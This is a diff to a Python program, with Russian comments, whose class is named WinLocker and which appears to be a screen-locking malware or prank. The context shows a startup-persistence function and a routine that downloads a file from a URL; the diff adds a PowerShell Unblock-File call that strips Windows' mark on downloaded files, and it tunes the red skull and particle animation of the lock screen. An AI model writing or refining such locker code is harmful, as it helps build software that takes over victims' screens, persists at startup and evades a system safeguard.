@@ -38,11 +38,13 @@ def add_to_startup():
     except:
         pass
 
-# === СКАЧИВАЕМ И ИГРАЕМ МУЗЫКУ (РЕПИТ НАВСЕГДА) ===
+# === СКАЧИВАЕМ И ИГРАЕМ МУЗЫКУ ===
 def play_music():
     if not os.path.exists(MUSIC_FILE):
         try:
             urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
+            # Снимаем блокировку Windows, если файл скачан из интернета
+            os.system('powershell -Command "Unblock-File -Path \'' + MUSIC_FILE + '\'"')
         except:
             pass
     try:
@@ -111,6 +113,7 @@ class WinLocker:
     
     def animate(self):
         self.canvas.delete("skull")
+        self.canvas.delete("particle")
         x_offset = random.randint(-5, 5)
         y_offset = random.randint(-5, 5)
         lines = [
@@ -125,10 +128,13 @@ class WinLocker:
         for line in lines:
             self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='red', font=('Courier', 16), tags="skull")
             y += 22
-        for _ in range(30):
+        
+        # Уменьшенные и тихие частицы (всего 10 штук, размер 2 пикселя)
+        for _ in range(10):
             x, y = random.randint(0, 800), random.randint(0, 600)
-            s = random.randint(2, 5)
-            self.canvas.create_oval(x, y, x+s, y+s, fill='red', outline='red', tags="particle")
+            s = 2  # размер меньше
+            self.canvas.create_oval(x, y, x+s, y+s, fill='#330000', outline='#330000', tags="particle")
+        
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='#0f0')
         else:
